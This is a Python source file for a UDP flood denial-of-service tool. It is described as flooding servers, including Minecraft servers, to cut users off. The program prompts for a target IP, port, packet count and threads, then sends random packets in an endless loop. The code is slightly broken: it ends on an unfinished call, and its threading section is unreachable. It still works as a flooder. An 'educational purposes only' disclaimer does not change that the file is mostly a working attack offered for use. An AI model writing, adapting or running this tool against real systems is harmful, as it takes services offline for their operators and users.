#author:
#█ ▄▀█ █▀▄▀█ ▀█▀ █▀█ █▀█ █▀ ▀█▀
#█ █▀█ █░▀░█ ░█░ █▄█ ▀▀█ ▄█ ░█░
#name:
#  █░█░█▀▄░█▀█  
# ░█▄█░█▄█░█▀▀░   ▀▀▀
#
# ▀█▀ █▀█ █▀█ █▀ ▀█▀ █▀▀ █▀█
#  █░ █▄█ ▀▀█ ▄█ ░█░ ██▄ █▀▄
#description:
# A node program that sends floods on a server with internet traffic to prevent users from accessing connected online services and minecraft servers

import os
import random
import sys
import socket
import threading

# Clear the terminal
os.system('clear' if os.name == 'posix' else 'cls')

def run(ip_run, port_run, times_run, threads_run):
    data_run = random._urandom(1024)

    try:
        while True:
            print("\033[1;31m[*]\033[0m \033[1mSending UDP packets to\033[0m "f"\033[1;38;2;255;100;100m{ip_run}\033[0m"":"f"\033[1;38;2;255;100;100m{port_run}\033[1;37m""!")
            s_run = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr_run = (str(ip_run), int(port_run))

            for x_run in range(times_run):
                s_run.sendto(data_run, addr_run)
            s_run.close()

    except KeyboardInterrupt:
        print("\n\033[1;31m[!]\033[0m \033[1;37mScript terminated by user (Ctrl+C). Exiting.\033[0m""")
        sys.exit(0)

    except Exception as e:
        sys.exit("\033[1;31m[!]\033[0m "f"\033[1;37m{e}\033[0m"".")

def main():
    print("")
    print("\033[1;31m█░█░█▀▄░█▀█      ▀█▀ █▀█ █▀█ █▀ ▀█▀ █▀▀ █▀█\033[0m")
    print("\033[1;31m█▄█░█▄█░█▀▀░ ▀▀▀ ░█░ █▄█ ▀▀█ ▄█ ░█░ ██▄ █▀▄\033[0m")
    print("")
    print("\033[1;31m[Warning]\033[1;37m This tool is for educational purposes \nonly, I am not responsible for any damages you \nhave caused or may cause, use it at your own risk!")
    print("")
    
    while True:
        try:
            ip = input("\033[1;31m[#]\033[0m ""\033[1;37mEnter target IP:\033[0m ")
            if ip.strip():
                break
            else:
                print("\033[1;31m[!]\033[0m \033[1;37mInvalid input. Please enter a valid target IP.\033[0m")
        except KeyboardInterrupt:
            print("\n\033[1;31m[!]\033[0m \033[1;37mScript terminated by user (Ctrl+C). Exiting.\033[0m")
            sys.exit(0)

    while True:
        try:
            port = int(input("\033[1;31m[#]\033[0m ""\033[1;37mEnter target port: \033[0m "))
            break  # Exit the loop if conversion to int is successful
        except ValueError:
            print("\033[1;31m[!]\033[0m \033[1;37mInvalid input. Please enter a valid integer for the port.\033[0m")
        except KeyboardInterrupt:
            print("\n\033[1;31m[!]\033[0m \033[1;37mScript terminated by user (Ctrl+C). Exiting.\033[0m")
            sys.exit(0)

    while True:
        try:
            times_input = input("\033[1;31m[#]\033[0m ""\033[1;37mEnter packets per connection: \033[0m ")
            if times_input.strip():  # Check if the input is not empty
                times = int(times_input)
                break  # Exit the loop if conversion to int is successful
            else:
                print("\033[1;31m[!]\033[0m \033[1;37mInvalid input. Please enter a valid integer for the packets.\033[0m")
        except ValueError:
            print("\033[1;31m[!]\033[0m \033[1;37mInvalid input. Please enter a valid integer for the packets.\033[0m")
        except KeyboardInterrupt:
            print("\n\033[1;31m[!]\033[0m \033[1;37mScript terminated by user (Ctrl+C). Exiting.\033[0m")
            sys.exit(0)

    while True:
        try:
            threads_input = input("\033[1;31m[#]\033[0m ""\033[1;37mEnter number of threads: \033[0m ")
            if threads_input.strip():  # Check if the input is not empty
                threads = int(threads_input)
                break  # Exit the loop if conversion to int is successful
            else:
                print("\033[1;31m[!]\033[0m \033[1;37mInvalid input. Please enter a valid integer for the threads.\033[0m")
        except ValueError:
            print("\033[1;31m[!]\033[0m \033[1;37mInvalid input. Please enter a valid integer for the threads.\033[0m")
        except KeyboardInterrupt:
            print("\n\033[1;31m[!]\033[0m \033[1;37mScript terminated by user (Ctrl+C). Exiting.\033[0m")
            sys.exit(0)

    
    data = random._urandom(1024)
    i = random.choice(("\033[1;31m[*]\033[0m", "\033[1;31m[!]\033[0m", "\033[1;31m[#]\033[0m"))
    error_occurred = False
    
    try:
        while True:
            print(i +" \033[1mSending UDP packets to\033[0m "f"\033[1;38;2;255;100;100m{ip}\033[0m"":"f"\033[1;38;2;255;100;100m{port}\033[1;37m""!")
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip), int(port))
            for x in range(times):
                s.sendto(data, addr)
            s.close()

    except KeyboardInterrupt:
        print("\n\033[1;31m[!]\033[0m ""\033[1;37mScript terminated by user (Ctrl+C). Exiting.\033[0m""")
        sys.exit(0)

    except Exception as e:
        if not error_occurred:
            error_occurred = True
            sys.exit("\033[1;31m[!]\033[0m "f"\033[1;37m{e}\033[0m"".")
                
    for y in range(threads):
        th = threading.Thread(target=run, args=(ip, port, times, threads))
        th.start()

if __name__ == "__main__":
    main(
